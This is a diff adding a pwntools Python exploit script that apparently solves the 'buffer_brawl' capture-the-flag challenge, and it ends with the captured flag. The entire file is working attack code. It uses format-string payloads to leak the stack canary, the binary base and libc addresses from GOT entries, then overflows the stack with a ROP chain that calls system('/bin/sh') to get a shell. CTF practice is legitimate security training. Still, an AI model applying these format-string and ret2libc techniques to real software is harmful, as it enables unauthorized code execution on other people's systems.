@@ -1,0 +1,64 @@
+from pwn import *
+
+e = ELF("./buffer_brawl_patched")
+libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
+
+#p = remote("buffer-brawl.chal.wwctf.com", 1337)
+#p = process("./buffer_brawl_patched")
+
+p = gdb.debug("./buffer_brawl_patched", gdbscript = '''
+b *stack_check_up+137
+''')
+
+
+p.sendlineafter(b"> ", b"4")
+
+payload = b"%12$p\n%27$p\n"
+p.sendafter(b"left?\n", payload)
+code_base = int(p.recvline()[:-1:], 16) - 0x24e0
+canary = int(p.recvline()[:-1:], 16)
+print(hex(canary), hex(code_base))
+
+puts_got = code_base + e.got['puts']
+read_got = code_base + e.got['read']
+printf_got = code_base + e.got['printf']
+
+p.sendlineafter(b"> ", b"4")
+payload = b"%7$s\x00\x00\x00\x00" + p64(puts_got)
+p.sendafter(b"left?\n", payload)
+libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
+print(hex(libc_leak))
+
+p.sendlineafter(b"> ", b"4")
+payload = b"%7$s\x00\x00\x00\x00" + p64(read_got)
+p.sendafter(b"left?\n", payload)
+libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
+print(hex(libc_leak))
+
+p.sendlineafter(b"> ", b"4")
+payload = b"%7$s\x00\x00\x00\x00" + p64(printf_got)
+p.sendafter(b"left?\n", payload)
+libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
+print(hex(libc_leak))
+
+libc_base = libc_leak - 0x606f0
+print(hex(libc_base))
+
+pop_rdi = libc_base + 0x000000000002a3e5
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+ret = pop_rdi + 1
+
+for i in range(29):
+    p.sendlineafter(b"> ", b"3")
+
+payload = b""
+payload += b"A" * 0x18 + p64(canary) + b"B" * 8
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret)
+payload += p64(system)
+
+p.sendlineafter(b"move: \n", payload)
+
+p.interactive()
+#wwf{C0ngr4ts_t0_th3_n3w_R0P4TT4CK_ch4mp10n_0f_th3_W0rld}
